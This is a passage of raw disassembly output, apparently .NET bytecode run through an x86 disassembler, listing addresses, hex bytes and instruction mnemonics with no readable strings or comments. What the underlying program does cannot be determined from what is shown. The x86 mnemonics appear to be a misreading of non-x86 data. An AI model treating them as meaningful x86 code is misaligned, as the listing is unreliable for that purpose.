  404bf4:	01 28                	add    %ebp,(%eax)
  404bf6:	00 00                	add    %al,(%eax)
  404bf8:	02 00                	add    (%eax),%al
  404bfa:	31 00                	xor    %eax,(%eax)
  404bfc:	29 5a 00             	sub    %ebx,0x0(%edx)
  404bff:	0a 00                	or     (%eax),%al
  404c01:	00 00                	add    %al,(%eax)
  404c03:	00 02                	add    %al,(%edx)
  404c05:	00 1f                	add    %bl,(%edi)
  404c07:	00 6a 89             	add    %ch,-0x77(%edx)
  404c0a:	00 0a                	add    %cl,(%edx)
	...
  404c14:	93                   	xchg   %eax,%ebx
  404c15:	93                   	xchg   %eax,%ebx
  404c16:	00 0a                	add    %cl,(%edx)
  404c18:	01 00                	add    %eax,(%eax)
  404c1a:	00 01                	add    %al,(%ecx)
  404c1c:	13 30                	adc    (%eax),%esi
  404c1e:	02 00                	add    (%eax),%al
  404c20:	2f                   	das
  404c21:	00 00                	add    %al,(%eax)
  404c23:	00 22                	add    %ah,(%edx)
  404c25:	00 00                	add    %al,(%eax)
  404c27:	11 28                	adc    %ebp,(%eax)
  404c29:	da 00                	fiaddl (%eax)
  404c2b:	00 0a                	add    %cl,(%edx)
  404c2d:	0a 16                	or     (%esi),%dl
  404c2f:	0b 2b                	or     (%ebx),%ebp
  404c31:	1d 06 07 9a 0c       	sbb    $0xc9a0706,%eax
  404c36:	08 6f db             	or     %ch,-0x25(%edi)
  404c39:	00 00                	add    %al,(%eax)
  404c3b:	0a 02                	or     (%edx),%al
  404c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  404c3e:	dc 00                	faddl  (%eax)
  404c40:	00 0a                	add    %cl,(%edx)
  404c42:	28 dd                	sub    %bl,%ch
  404c44:	00 00                	add    %al,(%eax)
  404c46:	0a 2c 02             	or     (%edx,%eax,1),%ch
  404c49:	08 2a                	or     %ch,(%edx)
  404c4b:	07                   	pop    %es
  404c4c:	17                   	pop    %ss
  404c4d:	58                   	pop    %eax
  404c4e:	0b 07                	or     (%edi),%eax
  404c50:	06                   	push   %es
  404c51:	8e 69 32             	mov    0x32(%ecx),%gs
  404c54:	dd 14 2a             	fstl   (%edx,%ebp,1)
  404c57:	00 1b                	add    %bl,(%ebx)
  404c59:	30 01                	xor    %al,(%ecx)
  404c5b:	00 11                	add    %dl,(%ecx)
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 00                	add    %al,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 20                	add    %ah,(%eax)
  404c65:	03 00                	add    (%eax),%eax
  404c67:	00 80 28 85 00 00    	add    %al,0x8528(%eax)
  404c6d:	06                   	push   %es
  404c6e:	26 de 03             	fiadds %es:(%ebx)
  404c71:	26 de 00             	fiadds %es:(%eax)
  404c74:	2a 00                	sub    (%eax),%al
  404c76:	00 00                	add    %al,(%eax)
  404c78:	01 10                	add    %edx,(%eax)
  404c7a:	00 00                	add    %al,(%eax)
  404c7c:	00 00                	add    %al,(%eax)
  404c7e:	00 00                	add    %al,(%eax)
  404c80:	0d 0d 00 03 01       	or     $0x103000d,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	01 13                	add    %edx,(%ebx)
  404c89:	30 03                	xor    %al,(%ebx)
  404c8b:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c8e:	00 00                	add    %al,(%eax)
  404c90:	02 00                	add    (%eax),%al
  404c92:	00 11                	add    %dl,(%ecx)
  404c94:	16                   	push   %ss
  404c95:	7e 08                	jle    0x404c9f
  404c97:	00 00                	add    %al,(%eax)
  404c99:	04 12                	add    $0x12,%al
  404c9b:	00 73 de             	add    %dh,-0x22(%ebx)
  404c9e:	00 00                	add    %al,(%eax)
  404ca0:	0a 80 39 00 00 04    	or     0x4000039(%eax),%al
  404ca6:	06                   	push   %es
  404ca7:	2a 1b                	sub    (%ebx),%bl
  404ca9:	30 03                	xor    %al,(%ebx)
  404cab:	00 24 00             	add    %ah,(%eax,%eax,1)
  404cae:	00 00                	add    %al,(%eax)
  404cb0:	00 00                	add    %al,(%eax)
  404cb2:	00 00                	add    %al,(%eax)
  404cb4:	14 fe                	adc    $0xfe,%al
  404cb6:	06                   	push   %es
  404cb7:	89 00                	mov    %eax,(%eax)
  404cb9:	00 06                	add    %al,(%esi)
  404cbb:	73 e0                	jae    0x404c9d
  404cbd:	00 00                	add    %al,(%eax)
  404cbf:	0a 28                	or     (%eax),%ch
  404cc1:	e1 00                	loope  0x404cc3
  404cc3:	00 0a                	add    %cl,(%edx)
  404cc5:	28 e2                	sub    %ah,%dl
  404cc7:	00 00                	add    %al,(%eax)
  404cc9:	0a 17                	or     (%edi),%dl
  404ccb:	16                   	push   %ss
  404ccc:	16                   	push   %ss
  404ccd:	28 8c 00 00 06 de 03 	sub    %cl,0x3de0600(%eax,%eax,1)
  404cd4:	26 de 00             	fiadds %es:(%eax)
  404cd7:	2a 01                	sub    (%ecx),%al
  404cd9:	10 00                	adc    %al,(%eax)
  404cdb:	00 00                	add    %al,(%eax)
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	00 20                	add    %ah,(%eax)
  404ce1:	20 00                	and    %al,(%eax)
  404ce3:	03 01                	add    (%ecx),%eax
  404ce5:	00 00                	add    %al,(%eax)
  404ce7:	01 1b                	add    %ebx,(%ebx)
  404ce9:	30 03                	xor    %al,(%ebx)
  404ceb:	00 18                	add    %bl,(%eax)
  404ced:	00 00                	add    %al,(%eax)
  404cef:	00 00                	add    %al,(%eax)
  404cf1:	00 00                	add    %al,(%eax)
  404cf3:	00 16                	add    %dl,(%esi)
  404cf5:	16                   	push   %ss
  404cf6:	16                   	push   %ss
  404cf7:	28 8c 00 00 06 de 0d 	sub    %cl,0xdde0600(%eax,%eax,1)
  404cfe:	26 20 a0 86 01 00 28 	and    %ah,%es:0x28000186(%eax)
  404d05:	14 00                	adc    $0x0,%al
  404d07:	00 0a                	add    %cl,(%edx)
  404d09:	2b f4                	sub    %esp,%esi
  404d0b:	2a 01                	sub    (%ecx),%al
  404d0d:	10 00                	adc    %al,(%eax)
  404d0f:	00 00                	add    %al,(%eax)
  404d11:	00 00                	add    %al,(%eax)
  404d13:	00 0a                	add    %cl,(%edx)
  404d15:	0a 00                	or     (%eax),%al
  404d17:	0d 01 00 00 01       	or     $0x1000001,%eax
  404d1c:	1b 30                	sbb    (%eax),%esi
  404d1e:	04 00                	add    $0x0,%al
  404d20:	38 00                	cmp    %al,(%eax)
  404d22:	00 00                	add    %al,(%eax)
  404d24:	23 00                	and    (%eax),%eax
  404d26:	00 11                	add    %dl,(%ecx)
  404d28:	7e 99                	jle    0x404cc3
  404d2a:	00 00                	add    %al,(%eax)
  404d2c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d2f:	00 00                	add    %al,(%eax)
  404d31:	04 18                	add    $0x18,%al
  404d33:	6f                   	outsl  %ds:(%esi),(%dx)
  404d34:	e3 00                	jecxz  0x404d36
  404d36:	00 0a                	add    %cl,(%edx)
  404d38:	0a 06                	or     (%esi),%al
  404d3a:	02 03                	add    (%ebx),%al
  404d3c:	18 6f e4             	sbb    %ch,-0x1c(%edi)
  404d3f:	00 00                	add    %al,(%eax)
  404d41:	0a 17                	or     (%edi),%dl
  404d43:	0b de                	or     %esi,%ebx
  404d45:	18 06                	sbb    %al,(%esi)
  404d47:	2c 06                	sub    $0x6,%al
  404d49:	06                   	push   %es
  404d4a:	6f                   	outsl  %ds:(%esi),(%dx)
  404d4b:	33 00                	xor    (%eax),%eax
  404d4d:	00 0a                	add    %cl,(%edx)
  404d4f:	dc 6f e5             	fsubrl -0x1b(%edi)
  404d52:	00 00                	add    %al,(%eax)
  404d54:	0a 28                	or     (%eax),%ch
  404d56:	95                   	xchg   %eax,%ebp
  404d57:	00 00                	add    %al,(%eax)
  404d59:	06                   	push   %es
  404d5a:	de 00                	fiadds (%eax)
  404d5c:	16                   	push   %ss
  404d5d:	2a 07                	sub    (%edi),%al
  404d5f:	2a 01                	sub    (%ecx),%al
  404d61:	1c 00                	sbb    $0x0,%al
  404d63:	00 02                	add    %al,(%edx)
  404d65:	00 11                	add    %dl,(%ecx)
  404d67:	00 0d 1e 00 0a 00    	add    %cl,0xa001e
  404d6d:	00 00                	add    %al,(%eax)
  404d6f:	00 00                	add    %al,(%eax)
  404d71:	00 00                	add    %al,(%eax)
  404d73:	00 28                	add    %ch,(%eax)
  404d75:	28 00                	sub    %al,(%eax)
  404d77:	0c 32                	or     $0x32,%al
  404d79:	00 00                	add    %al,(%eax)
  404d7b:	01 1b                	add    %ebx,(%ebx)
  404d7d:	30 02                	xor    %al,(%edx)
  404d7f:	00 39                	add    %bh,(%ecx)
  404d81:	00 00                	add    %al,(%eax)
  404d83:	00 24 00             	add    %ah,(%eax,%eax,1)
  404d86:	00 11                	add    %dl,(%ecx)
  404d88:	7e 99                	jle    0x404d23
  404d8a:	00 00                	add    %al,(%eax)
  404d8c:	0a 7e 3a             	or     0x3a(%esi),%bh
  404d8f:	00 00                	add    %al,(%eax)
  404d91:	04 6f                	add    $0x6f,%al
  404d93:	e6 00                	out    %al,$0x0
  404d95:	00 0a                	add    %cl,(%edx)
  404d97:	0a 06                	or     (%esi),%al
  404d99:	02 6f e7             	add    -0x19(%edi),%ch
  404d9c:	00 00                	add    %al,(%eax)
  404d9e:	0a 74 39 00          	or     0x0(%ecx,%edi,1),%dh
  404da2:	00 01                	add    %al,(%ecx)
  404da4:	0b de                	or     %esi,%ebx
  404da6:	18 06                	sbb    %al,(%esi)
  404da8:	2c 06                	sub    $0x6,%al
  404daa:	06                   	push   %es
  404dab:	6f                   	outsl  %ds:(%esi),(%dx)
  404dac:	33 00                	xor    (%eax),%eax
  404dae:	00 0a                	add    %cl,(%edx)
  404db0:	dc 6f e5             	fsubrl -0x1b(%edi)
  404db3:	00 00                	add    %al,(%eax)
  404db5:	0a 28                	or     (%eax),%ch
  404db7:	95                   	xchg   %eax,%ebp
  404db8:	00 00                	add    %al,(%eax)
  404dba:	06                   	push   %es
  404dbb:	de 00                	fiadds (%eax)
  404dbd:	14 2a                	adc    $0x2a,%al
  404dbf:	07                   	pop    %es
  404dc0:	2a 00                	sub    (%eax),%al
  404dc2:	00 00                	add    %al,(%eax)
  404dc4:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404dc7:	00 02                	add    %al,(%edx)
  404dc9:	00 10                	add    %dl,(%eax)
  404dcb:	00 0f                	add    %cl,(%edi)
  404dcd:	1f                   	pop    %ds
  404dce:	00 0a                	add    %cl,(%edx)
	...
  404dd8:	29 29                	sub    %ebp,(%ecx)
  404dda:	00 0c 32             	add    %cl,(%edx,%esi,1)
  404ddd:	00 00                	add    %al,(%eax)
  404ddf:	01 1b                	add    %ebx,(%ebx)
  404de1:	30 02                	xor    %al,(%edx)
  404de3:	00 35 00 00 00 23    	add    %dh,0x23000000
  404de9:	00 00                	add    %al,(%eax)
  404deb:	11 7e 99             	adc    %edi,-0x67(%esi)
  404dee:	00 00                	add    %al,(%eax)
  404df0:	0a 7e 3a             	or     0x3a(%esi),%bh
  404df3:	00 00                	add    %al,(%eax)
  404df5:	04 6f                	add    $0x6f,%al
  404df7:	e6 00                	out    %al,$0x0
  404df9:	00 0a                	add    %cl,(%edx)
  404dfb:	0a 06                	or     (%esi),%al
  404dfd:	02 6f e8             	add    -0x18(%edi),%ch
  404e00:	00 00                	add    %al,(%eax)
  404e02:	0a 17                	or     (%edi),%dl
  404e04:	0b de                	or     %esi,%ebx
  404e06:	18 06                	sbb    %al,(%esi)
  404e08:	2c 06                	sub    $0x6,%al
  404e0a:	06                   	push   %es
  404e0b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e0c:	33 00                	xor    (%eax),%eax
  404e0e:	00 0a                	add    %cl,(%edx)
  404e10:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e13:	00 00                	add    %al,(%eax)
  404e15:	0a 28                	or     (%eax),%ch
  404e17:	95                   	xchg   %eax,%ebp
  404e18:	00 00                	add    %al,(%eax)
  404e1a:	06                   	push   %es
  404e1b:	de 00                	fiadds (%eax)
  404e1d:	16                   	push   %ss
  404e1e:	2a 07                	sub    (%edi),%al
  404e20:	2a 00                	sub    (%eax),%al
  404e22:	00 00                	add    %al,(%eax)
  404e24:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  404e27:	00 02                	add    %al,(%edx)
  404e29:	00 10                	add    %dl,(%eax)
  404e2b:	00 0b                	add    %cl,(%ebx)
  404e2d:	1b 00                	sbb    (%eax),%eax
  404e2f:	0a 00                	or     (%eax),%al
  404e31:	00 00                	add    %al,(%eax)
  404e33:	00 00                	add    %al,(%eax)
  404e35:	00 00                	add    %al,(%eax)
  404e37:	00 25 25 00 0c 32    	add    %ah,0x320c0025
  404e3d:	00 00                	add    %al,(%eax)
  404e3f:	01 1b                	add    %ebx,(%ebx)
  404e41:	30 03                	xor    %al,(%ebx)
  404e43:	00 3a                	add    %bh,(%edx)
  404e45:	00 00                	add    %al,(%eax)
  404e47:	00 23                	add    %ah,(%ebx)
  404e49:	00 00                	add    %al,(%eax)
  404e4b:	11 7e 99             	adc    %edi,-0x67(%esi)
  404e4e:	00 00                	add    %al,(%eax)
  404e50:	0a 72 61             	or     0x61(%edx),%dh
  404e53:	20 00                	and    %al,(%eax)
  404e55:	70 17                	jo     0x404e6e
  404e57:	6f                   	outsl  %ds:(%esi),(%dx)
  404e58:	e9 00 00 0a 0a       	jmp    0xa4a4e5d
  404e5d:	06                   	push   %es
  404e5e:	7e 3a                	jle    0x404e9a
  404e60:	00 00                	add    %al,(%eax)
  404e62:	04 6f                	add    $0x6f,%al
  404e64:	ea 00 00 0a 17 0b de 	ljmp   $0xde0b,$0x170a0000
  404e6b:	18 06                	sbb    %al,(%esi)
  404e6d:	2c 06                	sub    $0x6,%al
  404e6f:	06                   	push   %es
  404e70:	6f                   	outsl  %ds:(%esi),(%dx)
  404e71:	33 00                	xor    (%eax),%eax
  404e73:	00 0a                	add    %cl,(%edx)
  404e75:	dc 6f e5             	fsubrl -0x1b(%edi)
  404e78:	00 00                	add    %al,(%eax)
  404e7a:	0a 28                	or     (%eax),%ch
  404e7c:	95                   	xchg   %eax,%ebp
  404e7d:	00 00                	add    %al,(%eax)
  404e7f:	06                   	push   %es
  404e80:	de 00                	fiadds (%eax)
  404e82:	16                   	push   %ss
  404e83:	2a 07                	sub    (%edi),%al
  404e85:	2a 00                	sub    (%eax),%al
  404e87:	00 01                	add    %al,(%ecx)
  404e89:	1c 00                	sbb    $0x0,%al
  404e8b:	00 02                	add    %al,(%edx)
  404e8d:	00 11                	add    %dl,(%ecx)
  404e8f:	00 0f                	add    %cl,(%edi)
  404e91:	20 00                	and    %al,(%eax)
  404e93:	0a 00                	or     (%eax),%al
  404e95:	00 00                	add    %al,(%eax)
  404e97:	00 00                	add    %al,(%eax)
  404e99:	00 00                	add    %al,(%eax)
  404e9b:	00 2a                	add    %ch,(%edx)
  404e9d:	2a 00                	sub    (%eax),%al
  404e9f:	0c 32                	or     $0x32,%al
  404ea1:	00 00                	add    %al,(%eax)
  404ea3:	01 1b                	add    %ebx,(%ebx)
  404ea5:	30 04 00             	xor    %al,(%eax,%eax,1)
  404ea8:	c4 01                	les    (%ecx),%eax
  404eaa:	00 00                	add    %al,(%eax)
  404eac:	25 00 00 11 73       	and    $0x73110000,%eax
  404eb1:	62 00                	bound  %eax,(%eax)
  404eb3:	00 06                	add    %al,(%esi)
  404eb5:	0a 06                	or     (%esi),%al
  404eb7:	02 74 03 00          	add    0x0(%ebx,%eax,1),%dh
  404ebb:	00 1b                	add    %bl,(%ebx)
  404ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ebe:	54                   	push   %esp
  404ebf:	00 00                	add    %al,(%eax)
  404ec1:	06                   	push   %es
  404ec2:	06                   	push   %es
  404ec3:	72 75                	jb     0x404f3a
  404ec5:	20 00                	and    %al,(%eax)
  404ec7:	70 6f                	jo     0x404f38
  404ec9:	4d                   	dec    %ebp
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	06                   	push   %es
  404ecd:	6f                   	outsl  %ds:(%esi),(%dx)
  404ece:	59                   	pop    %ecx
  404ecf:	00 00                	add    %al,(%eax)
  404ed1:	06                   	push   %es
  404ed2:	0b 07                	or     (%edi),%eax
  404ed4:	39 8c 01 00 00 07 72 	cmp    %ecx,0x72070000(%ecx,%eax,1)
  404edb:	0b 26                	or     (%esi),%esp
  404edd:	00 70 28             	add    %dh,0x28(%eax)
  404ee0:	27                   	daa
  404ee1:	00 00                	add    %al,(%eax)
  404ee3:	0a 2d 22 07 72 15    	or     0x15720722,%ch
  404ee9:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404eed:	27                   	daa
  404eee:	00 00                	add    %al,(%eax)
  404ef0:	0a 2d 56 07 72 23    	or     0x23720756,%ch
  404ef6:	26 00 70 28          	add    %dh,%es:0x28(%eax)
  404efa:	27                   	daa
  404efb:	00 00                	add    %al,(%eax)
  404efd:	0a 3a                	or     (%edx),%bh
  404eff:	cb                   	lret
  404f00:	00 00                	add    %al,(%eax)
  404f02:	00 38                	add    %bh,(%eax)
  404f04:	5d                   	pop    %ebp
  404f05:	01 00                	add    %eax,(%eax)
  404f07:	00 28                	add    %ch,(%eax)
  404f09:	17                   	pop    %ss
  404f0a:	00 00                	add    %al,(%eax)
  404f0c:	06                   	push   %es
  404f0d:	0c 73                	or     $0x73,%al
  404f0f:	62 00                	bound  %eax,(%eax)
  404f11:	00 06                	add    %al,(%esi)
  404f13:	25 72 75 20 00       	and    $0x207572,%eax
  404f18:	70 6f                	jo     0x404f89
  404f1a:	4d                   	dec    %ebp
  404f1b:	00 00                	add    %al,(%eax)
  404f1d:	06                   	push   %es
  404f1e:	72 0b                	jb     0x404f2b
  404f20:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f24:	4f                   	dec    %edi
  404f25:	00 00                	add    %al,(%eax)
  404f27:	06                   	push   %es
  404f28:	25 72 8d 20 00       	and    $0x208d72,%eax
  404f2d:	70 6f                	jo     0x404f9e
  404f2f:	4d                   	dec    %ebp
  404f30:	00 00                	add    %al,(%eax)
  404f32:	06                   	push   %es
  404f33:	08 6a 6f             	or     %ch,0x6f(%edx)
  404f36:	42                   	inc    %edx
  404f37:	00 00                	add    %al,(%eax)
  404f39:	06                   	push   %es
  404f3a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f3b:	57                   	push   %edi
  404f3c:	00 00                	add    %al,(%eax)
  404f3e:	06                   	push   %es
  404f3f:	28 1e                	sub    %bl,(%esi)
  404f41:	00 00                	add    %al,(%eax)
  404f43:	06                   	push   %es
  404f44:	38 1c 01             	cmp    %bl,(%ecx,%eax,1)
  404f47:	00 00                	add    %al,(%eax)
  404f49:	00 06                	add    %al,(%esi)
  404f4b:	28 93 00 00 06 dd    	sub    %dl,-0x22fa0000(%ebx)
  404f51:	10 01                	adc    %al,(%ecx)
  404f53:	00 00                	add    %al,(%eax)
  404f55:	0d 06 72 39 26       	or     $0x26397206,%eax
  404f5a:	00 70 6f             	add    %dh,0x6f(%eax)
  404f5d:	4d                   	dec    %ebp
  404f5e:	00 00                	add    %al,(%eax)
  404f60:	06                   	push   %es
  404f61:	6f                   	outsl  %ds:(%esi),(%dx)
  404f62:	59                   	pop    %ecx
  404f63:	00 00                	add    %al,(%eax)
  404f65:	06                   	push   %es
  404f66:	28 8e 00 00 06 2d    	sub    %cl,0x2d060000(%esi)
  404f6c:	51                   	push   %ecx
  404f6d:	7e 3b                	jle    0x404faa
  404f6f:	00 00                	add    %al,(%eax)
  404f71:	04 06                	add    $0x6,%al
  404f73:	6f                   	outsl  %ds:(%esi),(%dx)
  404f74:	5d                   	pop    %ebp
  404f75:	00 00                	add    %al,(%eax)
  404f77:	0a 73 62             	or     0x62(%ebx),%dh
  404f7a:	00 00                	add    %al,(%eax)
  404f7c:	06                   	push   %es
  404f7d:	25 72 75 20 00       	and    $0x207572,%eax
  404f82:	70 6f                	jo     0x404ff3
  404f84:	4d                   	dec    %ebp
  404f85:	00 00                	add    %al,(%eax)
  404f87:	06                   	push   %es
  404f88:	72 41                	jb     0x404fcb
  404f8a:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404f8e:	4f                   	dec    %edi
  404f8f:	00 00                	add    %al,(%eax)
  404f91:	06                   	push   %es
  404f92:	25 72 57 26 00       	and    $0x265772,%eax
  404f97:	70 6f                	jo     0x405008
  404f99:	4d                   	dec    %ebp
  404f9a:	00 00                	add    %al,(%eax)
  404f9c:	06                   	push   %es
  404f9d:	06                   	push   %es
  404f9e:	72 39                	jb     0x404fd9
  404fa0:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fa4:	4d                   	dec    %ebp
  404fa5:	00 00                	add    %al,(%eax)
  404fa7:	06                   	push   %es
  404fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  404fa9:	59                   	pop    %ecx
  404faa:	00 00                	add    %al,(%eax)
  404fac:	06                   	push   %es
  404fad:	6f                   	outsl  %ds:(%esi),(%dx)
  404fae:	4f                   	dec    %edi
  404faf:	00 00                	add    %al,(%eax)
  404fb1:	06                   	push   %es
  404fb2:	6f                   	outsl  %ds:(%esi),(%dx)
  404fb3:	57                   	push   %edi
  404fb4:	00 00                	add    %al,(%eax)
  404fb6:	06                   	push   %es
  404fb7:	28 1e                	sub    %bl,(%esi)
  404fb9:	00 00                	add    %al,(%eax)
  404fbb:	06                   	push   %es
  404fbc:	2b 0b                	sub    (%ebx),%ecx
  404fbe:	09 6f e5             	or     %ebp,-0x1b(%edi)
  404fc1:	00 00                	add    %al,(%eax)
  404fc3:	0a 28                	or     (%eax),%ch
  404fc5:	95                   	xchg   %eax,%ebp
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	06                   	push   %es
  404fc9:	dd 97 00 00 00 06    	fstl   0x6000000(%edi)
  404fcf:	72 65                	jb     0x405036
  404fd1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fd5:	4d                   	dec    %ebp
  404fd6:	00 00                	add    %al,(%eax)
  404fd8:	06                   	push   %es
  404fd9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fda:	59                   	pop    %ecx
  404fdb:	00 00                	add    %al,(%eax)
  404fdd:	06                   	push   %es
  404fde:	06                   	push   %es
  404fdf:	72 39                	jb     0x40501a
  404fe1:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  404fe5:	4d                   	dec    %ebp
  404fe6:	00 00                	add    %al,(%eax)
  404fe8:	06                   	push   %es
  404fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  404fea:	59                   	pop    %ecx
  404feb:	00 00                	add    %al,(%eax)
  404fed:	06                   	push   %es
  404fee:	28 8d 00 00 06 26    	sub    %cl,0x26060000(%ebp)
  404ff4:	7e 3b                	jle    0x405031
  404ff6:	00 00                	add    %al,(%eax)
  404ff8:	04 28                	add    $0x28,%al
  404ffa:	03 00                	add    (%eax),%eax
  404ffc:	00 2b                	add    %ch,(%ebx)
  404ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  404fff:	5e                   	pop    %esi
  405000:	00 00                	add    %al,(%eax)
  405002:	0a 13                	or     (%ebx),%dl
  405004:	04 2b                	add    $0x2b,%al
  405006:	45                   	inc    %ebp
  405007:	12 04 28             	adc    (%eax,%ebp,1),%al
  40500a:	5f                   	pop    %edi
  40500b:	00 00                	add    %al,(%eax)
  40500d:	0a 13                	or     (%ebx),%dl
  40500f:	05 11 05 72 39       	add    $0x39720511,%eax
  405014:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405018:	4d                   	dec    %ebp
  405019:	00 00                	add    %al,(%eax)
  40501b:	06                   	push   %es
  40501c:	6f                   	outsl  %ds:(%esi),(%dx)
  40501d:	59                   	pop    %ecx
  40501e:	00 00                	add    %al,(%eax)
  405020:	06                   	push   %es
  405021:	06                   	push   %es
  405022:	72 65                	jb     0x405089
  405024:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405028:	4d                   	dec    %ebp
  405029:	00 00                	add    %al,(%eax)
  40502b:	06                   	push   %es
  40502c:	6f                   	outsl  %ds:(%esi),(%dx)
  40502d:	59                   	pop    %ecx
  40502e:	00 00                	add    %al,(%eax)
  405030:	06                   	push   %es
  405031:	28 27                	sub    %ah,(%edi)
  405033:	00 00                	add    %al,(%eax)
  405035:	0a 2c 14             	or     (%esp,%edx,1),%ch
  405038:	11 05 28 93 00 00    	adc    %eax,0x9328
  40503e:	06                   	push   %es
  40503f:	7e 3b                	jle    0x40507c
  405041:	00 00                	add    %al,(%eax)
  405043:	04 11                	add    $0x11,%al
  405045:	05 6f ec 00 00       	add    $0xec6f,%eax
  40504a:	0a 26                	or     (%esi),%ah
  40504c:	12 04 28             	adc    (%eax,%ebp,1),%al
  40504f:	61                   	popa
  405050:	00 00                	add    %al,(%eax)
  405052:	0a 2d b2 de 0e 12    	or     0x120edeb2,%ch
  405058:	04 fe                	add    $0xfe,%al
  40505a:	16                   	push   %ss
  40505b:	02 00                	add    (%eax),%al
  40505d:	00 1b                	add    %bl,(%ebx)
  40505f:	6f                   	outsl  %ds:(%esi),(%dx)
  405060:	33 00                	xor    (%eax),%eax
  405062:	00 0a                	add    %cl,(%edx)
  405064:	dc de                	(bad)
  405066:	0c 6f                	or     $0x6f,%al
  405068:	e5 00                	in     $0x0,%eax
  40506a:	00 0a                	add    %cl,(%edx)
  40506c:	28 95 00 00 06 de    	sub    %dl,-0x21fa0000(%ebp)
  405072:	00 2a                	add    %ch,(%edx)
  405074:	41                   	inc    %ecx
  405075:	4c                   	dec    %esp
  405076:	00 00                	add    %al,(%eax)
  405078:	00 00                	add    %al,(%eax)
  40507a:	00 00                	add    %al,(%eax)
  40507c:	9a 00 00 00 0b 00 00 	lcall  $0x0,$0xb000000
  405083:	00 a5 00 00 00 79    	add    %ah,0x79000000(%ebp)
  405089:	00 00                	add    %al,(%eax)
  40508b:	00 32                	add    %dh,(%edx)
  40508d:	00 00                	add    %al,(%eax)
  40508f:	01 02                	add    %eax,(%edx)
  405091:	00 00                	add    %al,(%eax)
  405093:	00 55 01             	add    %dl,0x1(%ebp)
  405096:	00 00                	add    %al,(%eax)
  405098:	52                   	push   %edx
  405099:	00 00                	add    %al,(%eax)
  40509b:	00 a7 01 00 00 0e    	add    %ah,0xe000001(%edi)
	...
  4050ad:	00 00                	add    %al,(%eax)
  4050af:	00 b7 01 00 00 b7    	add    %dh,-0x48ffffff(%edi)
  4050b5:	01 00                	add    %eax,(%eax)
  4050b7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4050ba:	00 00                	add    %al,(%eax)
  4050bc:	32 00                	xor    (%eax),%al
  4050be:	00 01                	add    %al,(%ecx)
  4050c0:	13 30                	adc    (%eax),%esi
  4050c2:	0b 00                	or     (%eax),%eax
  4050c4:	1b 01                	sbb    (%ecx),%eax
  4050c6:	00 00                	add    %al,(%eax)
  4050c8:	26 00 00             	add    %al,%es:(%eax)
  4050cb:	11 28                	adc    %ebp,(%eax)
  4050cd:	ed                   	in     (%dx),%eax
  4050ce:	00 00                	add    %al,(%eax)
  4050d0:	0a 02                	or     (%edx),%al
  4050d2:	72 39                	jb     0x40510d
  4050d4:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4050d8:	4d                   	dec    %ebp
  4050d9:	00 00                	add    %al,(%eax)
  4050db:	06                   	push   %es
  4050dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4050dd:	59                   	pop    %ecx
  4050de:	00 00                	add    %al,(%eax)
  4050e0:	06                   	push   %es
  4050e1:	28 8e 00 00 06 28    	sub    %cl,0x28060000(%esi)
  4050e7:	9a 00 00 0a 28 1c 00 	lcall  $0x1c,$0x280a0000
  4050ee:	00 0a                	add    %cl,(%edx)
  4050f0:	28 a0 00 00 06 6f    	sub    %ah,0x6f060000(%eax)
  4050f6:	ee                   	out    %al,(%dx)
  4050f7:	00 00                	add    %al,(%eax)
  4050f9:	0a 72 6f             	or     0x6f(%edx),%dh
  4050fc:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  405100:	ef                   	out    %eax,(%dx)
  405101:	00 00                	add    %al,(%eax)
  405103:	0a 28                	or     (%eax),%ch
  405105:	f0 00 00             	lock add %al,(%eax)
  405108:	0a 0a                	or     (%edx),%cl
  40510a:	7e 3c                	jle    0x405148
  40510c:	00 00                	add    %al,(%eax)
  40510e:	04 3a                	add    $0x3a,%al
  405110:	85 00                	test   %eax,(%eax)
  405112:	00 00                	add    %al,(%eax)
  405114:	20 00                	and    %al,(%eax)
  405116:	01 00                	add    %eax,(%eax)
  405118:	00 72 8b             	add    %dh,-0x75(%edx)
  40511b:	26 00 70 14          	add    %dh,%es:0x14(%eax)
  40511f:	d0 16                	rclb   $1,(%esi)
  405121:	00 00                	add    %al,(%eax)
  405123:	02 28                	add    (%eax),%ch
  405125:	f1                   	int1
  405126:	00 00                	add    %al,(%eax)
  405128:	0a 1f                	or     (%edi),%bl
  40512a:	09 8d 86 00 00 01    	or     %ecx,0x1000086(%ebp)
  405130:	25 16 16 14 28       	and    $0x28141616,%eax
  405135:	f2 00 00             	repnz add %al,(%eax)
  405138:	0a a2 25 17 17 14    	or     0x14171725(%edx),%ah
  40513e:	28 f2                	sub    %dh,%dl
  405140:	00 00                	add    %al,(%eax)
  405142:	0a a2 25 18 17 14    	or     0x14171825(%edx),%ah
  405148:	28 f2                	sub    %dh,%dl
  40514a:	00 00                	add    %al,(%eax)
  40514c:	0a a2 25 19 17 14    	or     0x14171925(%edx),%ah
  405152:	28 f2                	sub    %dh,%dl
  405154:	00 00                	add    %al,(%eax)
  405156:	0a a2 25 1a 17 14    	or     0x14171a25(%edx),%ah
  40515c:	28 f2                	sub    %dh,%dl
